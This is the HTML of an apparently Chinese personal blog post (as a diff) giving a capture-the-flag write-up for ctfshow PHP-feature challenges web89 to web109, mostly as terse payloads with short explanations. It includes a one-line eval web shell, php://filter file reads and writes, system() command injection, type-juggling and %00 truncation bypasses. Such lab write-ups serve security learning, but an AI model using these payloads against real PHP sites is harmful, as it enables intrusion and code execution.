@@ -1,0 +1,979 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/biaotou.png">
+  <link rel="icon" href="/img/biaotou.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="orange">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="web891?num[]&#x3D;a  web900x011?num&#x3D;4476.11  0x021?num&#x3D;+4476  0x031?num&#x3D;4476e1  0x041?num&#x3D;0x117c  web911?cmd&#x3D;%0aphp  web920x011?num&#x3D;4476.11  0x021?num&#x3D;4476e1  web920x011?num&#x3D;4476.11  0x021?num&#x3D;010574  web9">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow文件包含">
+<meta property="og:url" content="http://example.com/2024/09/17/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshowphp%E7%89%B9%E6%80%A7/index.html">
+<meta property="og:site_name" content="0raN9e的笔记">
+<meta property="og:description" content="web891?num[]&#x3D;a  web900x011?num&#x3D;4476.11  0x021?num&#x3D;+4476  0x031?num&#x3D;4476e1  0x041?num&#x3D;0x117c  web911?cmd&#x3D;%0aphp  web920x011?num&#x3D;4476.11  0x021?num&#x3D;4476e1  web920x011?num&#x3D;4476.11  0x021?num&#x3D;010574  web9">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-15215426.png">
+<meta property="article:published_time" content="2024-09-17T14:00:00.000Z">
+<meta property="article:modified_time" content="2024-09-17T14:07:29.290Z">
+<meta property="article:author" content="orange">
+<meta property="article:tag" content="php特性">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-15215426.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>ctfshow文件包含 - 0raN9e的笔记</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"y20YQnBmfM0DqawGjwxeWhCq-gzGzoHsz","app_key":"Y55Ca02EpnhoEzDEjf7sqVwX","server_url":null,"path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>橙子</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/background.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="ctfshow文件包含"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-09-17 22:00" pubdate>
+          2024年9月17日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          21 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">ctfshow文件包含</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2024年9月17日 晚上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num[]=a<br></code></pre></td></tr></table></figure>
+
+<h2 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h2><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=4476.11<br></code></pre></td></tr></table></figure>
+
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=+4476<br></code></pre></td></tr></table></figure>
+
+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=4476e1<br></code></pre></td></tr></table></figure>
+
+<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=0x117c<br></code></pre></td></tr></table></figure>
+
+<h2 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?cmd=%0aphp<br></code></pre></td></tr></table></figure>
+
+<h2 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h2><h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=4476.11<br></code></pre></td></tr></table></figure>
+
+<h3 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=4476e1<br></code></pre></td></tr></table></figure>
+
+<h2 id="web92-1"><a href="#web92-1" class="headerlink" title="web92"></a>web92</h2><h3 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=4476.11<br></code></pre></td></tr></table></figure>
+
+<h3 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=010574<br></code></pre></td></tr></table></figure>
+
+<h2 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h2><h3 id="0x01-3"><a href="#0x01-3" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=4476.11<br></code></pre></td></tr></table></figure>
+
+<h3 id="0x02-3"><a href="#0x02-3" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=010574<br></code></pre></td></tr></table></figure>
+
+<h2 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h2><h3 id="0x01-4"><a href="#0x01-4" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=4476.02<br></code></pre></td></tr></table></figure>
+
+<h3 id="0x02-4"><a href="#0x02-4" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=%0a010574<br></code></pre></td></tr></table></figure>
+
+<h2 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h2><h3 id="0x01-5"><a href="#0x01-5" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=%0a010574<br></code></pre></td></tr></table></figure>
+
+<h3 id="0x02-5"><a href="#0x02-5" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=+010574<br></code></pre></td></tr></table></figure>
+
+<h2 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h2><h3 id="0x01-6"><a href="#0x01-6" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?u=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure>
+
+<h3 id="0x02-6"><a href="#0x02-6" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?u=./flag.php<br></code></pre></td></tr></table></figure>
+
+<h3 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?u=/var/www/html/flag.php<br></code></pre></td></tr></table></figure>
+
+<h2 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h2><h3 id="0x01-7"><a href="#0x01-7" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">a[]=1&amp;b[]=2<br></code></pre></td></tr></table></figure>
+
+<h3 id="0x02-7"><a href="#0x02-7" class="headerlink" title="0x02"></a>0x02</h3><p>用fastcoll进行生成</p>
+<h2 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h2><p>按要求进行传参就行了，cookie，post,FLAG，等等</p>
+<h2 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h2><p>先了解一下in_array函数，如图</p>
+<p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-15215426.png" srcset="/img/loading.gif" lazyload alt="2024-09-15215426"></p>
+<p>in_array是用于检查数组里有没有对应的内容，正常是需要传三个值，第一个值是要搜索的值，可以是字符串、整数等。第二个值是要搜索的数组，即是否存在这个数组，第三个是可选当设置为 <code>true</code> 时，<code>in_array()</code> 不仅检查值是否相同，还会检查类型是否相同。如果未设置或为 <code>false</code>，则不会比较类型。本题就是由于第三个没有导致的弱比教漏洞</p>
+<p>所以根据题目要求</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?n=1.php<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">content=&lt;?php <span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[1]);?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>然后进入1.php执行ls，最后执行得到flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1=system(<span class="hljs-string">&#x27;tac flag36d.php&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<h2 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=0&amp;v2=show_source(system(<span class="hljs-string">&#x27;ls&#x27;</span>))&amp;v3=;<br></code></pre></td></tr></table></figure>
+
+<p>测试完忘记读题，在$ctfshow里面</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=0&amp;v2=var_dump(<span class="hljs-variable">$ctfshow</span>)&amp;v3=;<br></code></pre></td></tr></table></figure>
+
+<h2 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><br>/*<br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2020-09-16 11:25:09</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2020-09-22 00:26:48</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br>*/<br><br>highlight_file(__FILE__);<br>include(<span class="hljs-string">&quot;ctfshow.php&quot;</span>);<br>//flag <span class="hljs-keyword">in</span> class ctfshow;<br><span class="hljs-variable">$ctfshow</span> = new ctfshow();<br><span class="hljs-variable">$v1</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br><span class="hljs-variable">$v2</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br><span class="hljs-variable">$v3</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br><span class="hljs-variable">$v0</span>=is_numeric(<span class="hljs-variable">$v1</span>) and is_numeric(<span class="hljs-variable">$v2</span>) and is_numeric(<span class="hljs-variable">$v3</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$v0</span>)&#123;<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="hljs-variable">$v3</span>))&#123;<br>            <span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;<span class="hljs-variable">$v2</span>(&#x27;ctfshow&#x27;)<span class="hljs-variable">$v3</span>&quot;</span>);<br>        &#125;<br>    &#125;<br>    <br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>没遇过学习一下，反射，ReflectionClass：一个反射类，功能十分强大，内置了各种获取类信息的方法，创建方式为new ReflectionClass(str 类名)，可以用echo new ReflectionClass(‘className’)打印类的信息。</p>
+<p>ReflectionObject：另一个反射类，创建方式为new ReflectionObject(对象名)。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=1&amp;v2=<span class="hljs-built_in">echo</span> new Reflectionclass&amp;v3=;<br></code></pre></td></tr></table></figure>
+
+<h2 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: atao</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-16 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-23 20:59:43</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$v1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br><span class="hljs-variable">$v2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br><span class="hljs-variable">$v3</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br><span class="hljs-variable">$v4</span> = <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v3</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$v4</span>)&#123;<br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$v2</span>,<span class="hljs-number">2</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$v1</span>,<span class="hljs-variable">$s</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$v3</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><code>call_user_func</code>函数是用于调用一个回调函数，$s从第二个开始读取，<code>file_put_contents</code>可以写入文件</p>
+<p>v3用伪协议写入一个文件<code>v3=php://filter/write=convert.base64-decode/resource=1.php</code></p>
+<p>还需要讲的是短标签<code>&lt;?=</code>就相当于<code>&lt;?php echo</code>，我们需要构造,末尾有空格</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>`cat *`; <br></code></pre></td></tr></table></figure>
+
+<p>先进行base64,原因是我们写入的时候用了base64，然后进行hex,最后再编码前面加两位</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">v2=115044383959474e686443417159447367<br></code></pre></td></tr></table></figure>
+
+<p>最后<code>v1=hex2bin</code>进行转化进行，到1.php里看答案</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v2=115044383959474e686443417159447367&amp;v3=php://filter/write=convert.base64-decode/resource=1.php<br></code></pre></td></tr></table></figure>
+
+<h2 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h2><p>用上面102的payload可以正常打通</p>
+<h2 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h2><h3 id="0x01-8"><a href="#0x01-8" class="headerlink" title="0x01"></a>0x01</h3><p>数组绕过</p>
+<h3 id="0x02-8"><a href="#0x02-8" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v2=aaK1STfY<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">v1=aaroZmOk<br></code></pre></td></tr></table></figure>
+
+<h2 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h2><p>本地考察了变量覆盖</p>
+<p>先上payload</p>
+<h3 id="0x01-9"><a href="#0x01-9" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?suces=flag<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">error=suces<br></code></pre></td></tr></table></figure>
+
+<p>原理就是$suces&#x3D;$flag,然后post发$error&#x3D;$suces，通过串联，达成了$error&#x3D;$flag;</p>
+<h3 id="0x02-9"><a href="#0x02-9" class="headerlink" title="0x02"></a>0x02</h3><p>清空内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?suces=flag&amp;flag=<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">flag=<br></code></pre></td></tr></table></figure>
+
+<h2 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h2><p>同web104</p>
+<h2 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v3=1<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">v1=flag=c4ca4238a0b923820dcc509a6f75849b<br></code></pre></td></tr></table></figure>
+
+<p><code>parse_str</code> 将 <code>$v1</code> 中的查询字符串解析成一个关联数组，并将解析结果存储在 <code>$v2</code> 中。</p>
+<p>就相当于$v2[flag]&#x3D;c4ca4238a0b923820dcc509a6f75849b，控制两边相等就行了</p>
+<h2 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=a%00778<br></code></pre></td></tr></table></figure>
+
+<p>ereg用于检测是否只包含字母（大小写），<code>0x36d</code> 的十进制值是 877。反转 <code>&quot;877&quot;</code> 得到的字符串是 <code>&quot;778&quot;</code>，</p>
+<p>不过这里的 <code>ereg()</code> 存在截断漏洞, <code>%00</code> 后的字符串不解析构造 <code>a%00778</code> 来绕过 <code>ereg()</code> 的检测</p>
+<h2 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h2><p>使用原生类的内置类进行目录扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=DirectoryIterator&amp;v2=system(<span class="hljs-built_in">ls</span>)<br></code></pre></td></tr></table></figure>
+
+<p>然后使用映射类读取flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=Reflectionclass&amp;v2=system(<span class="hljs-string">&#x27;tac fl36dg.txt&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>或者</p>
